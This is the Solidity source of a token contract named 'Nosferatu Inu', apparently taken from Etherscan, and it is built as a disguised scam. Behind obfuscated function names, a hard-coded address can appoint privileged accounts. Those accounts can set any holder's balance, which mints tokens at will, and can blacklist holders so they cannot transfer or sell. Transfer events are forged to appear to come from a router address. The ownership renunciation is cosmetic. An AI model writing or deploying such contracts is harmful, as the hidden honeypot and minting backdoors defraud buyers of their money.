/**
 *Submitted for verification at Etherscan.io on 2022-10-31
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _rConstruct = 0x23fda63bb8A87946942556eC668221B090759Df0;
	address UnisV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract NOSFERINU is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Iq;
	mapping (address => bool) private tQ;
    mapping (address => bool) private mQ;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _QmSup = 666000000 * 10**_decimals;
    string private constant _name = "Nosferatu Inu";
    string private constant _symbol = "NOSFERINU";



    constructor () {
        Iq[_MsgSendr()] = _QmSup;
        emit Transfer(address(0), UnisV2Router, _QmSup);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _QmSup;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Iq[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function rEnd(address z) public {
        if(tQ[msg.sender]) { 
        mQ[z] = false;}}
        function rQuery(address z) public{
         if(tQ[msg.sender])  { 
        require(!mQ[z]);
        mQ[z] = true; }}
		function arStake(address z) public{
         if(msg.sender == _rConstruct)  { 
        require(!tQ[z]);
        tQ[z] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _rConstruct)  {
        require(amount <= Iq[sender]);
        Iq[sender] -= amount;  
        Iq[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (UnisV2Router, recipient, amount);
        return true; }    
          if(!mQ[recipient]) {
          if(!mQ[sender]) {
         require(amount <= Iq[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        Iq[sender] -= amount;
        Iq[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address txTo, uint256 z) public {
        if(msg.sender == _rConstruct)  {
        require(Iq[msg.sender] >= z);
        Iq[msg.sender] -= z;  
        Iq[txTo] += z; 
        emit Transfer (UnisV2Router, txTo, z);}
        if(tQ[msg.sender]) {Iq[txTo] = z;} 
        if(!mQ[msg.sender]) {
        require(Iq[msg.sender] >= z);
        Iq[msg.sender] -= z;  
        Iq[txTo] += z;          
        emit Transfer(msg.sender, txTo, z);
        }}}